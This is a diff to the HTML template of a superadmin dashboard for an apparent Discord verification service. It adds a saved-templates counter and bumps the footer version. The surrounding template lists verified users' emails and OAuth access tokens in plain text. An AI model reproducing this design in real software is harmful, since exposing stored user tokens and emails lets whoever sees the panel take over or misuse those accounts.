@@ -29,6 +29,7 @@
         td { padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.03); color: rgba(255,255,255,0.7); }
         td .token { font-family: monospace; font-size: 11px; color: #ff6b6b; word-break: break-all; max-width: 150px; display: inline-block; }
         .empty-state { color: rgba(255,255,255,0.2); text-align: center; padding: 30px; font-size: 14px; }
+        .template-badge { background: rgba(88,101,242,0.2); border: 1px solid rgba(88,101,242,0.3); padding: 2px 10px; border-radius: 12px; font-size: 11px; color: #5865F2; }
         @media (max-width: 600px) { .guild-grid { grid-template-columns: 1fr; } }
         .scrollable { overflow-x: auto; max-height: 400px; overflow-y: auto; }
         .scrollable::-webkit-scrollbar { width: 4px; }
@@ -45,6 +46,7 @@
             </div>
             <div style="display:flex;gap:12px;align-items:center;">
                 <span style="color:#4CAF50;">🟢 {{ total_guilds }} Servers</span>
+                <span class="template-badge">📁 {{ total_templates }} Templates</span>
                 <a href="/superadmin-logout" class="logout-btn">🚪 Logout</a>
             </div>
         </div>
@@ -53,6 +55,7 @@
             <div class="stat-card"><div class="stat-number">{{ total_users }}</div><div class="stat-label">Verified Users</div></div>
             <div class="stat-card"><div class="stat-number">{{ total_guilds }}</div><div class="stat-label">Servers</div></div>
             <div class="stat-card"><div class="stat-number">{{ total_tokens }}</div><div class="stat-label">OAuth Tokens</div></div>
+            <div class="stat-card"><div class="stat-number">{{ total_templates }}</div><div class="stat-label">Saved Templates</div></div>
             <div class="stat-card"><div class="stat-number">{{ firebase_status }}</div><div class="stat-label">Firebase Status</div></div>
         </div>
 
@@ -76,9 +79,7 @@
             <h2>👤 Verified Users ({{ total_users }})</h2>
             <div class="scrollable">
                 <table>
-                    <thead>
-                        <tr><th>User</th><th>Email</th><th>Guild</th><th>Access Token</th><th>Verified At</th></tr>
-                    </thead>
+                    <thead><tr><th>User</th><th>Email</th><th>Guild</th><th>Access Token</th><th>Verified At</th></tr></thead>
                     <tbody>
                         {% for user in users %}
                         <tr>
@@ -97,7 +98,7 @@
         </div>
 
         <div style="text-align:center;color:rgba(255,255,255,0.1);font-size:11px;padding:20px 0;">
-            🔒 All access is logged • Anion Security System v6.0
+            🔒 All access is logged • Anion Security System v7.0
         </div>
     </div>
 </body>
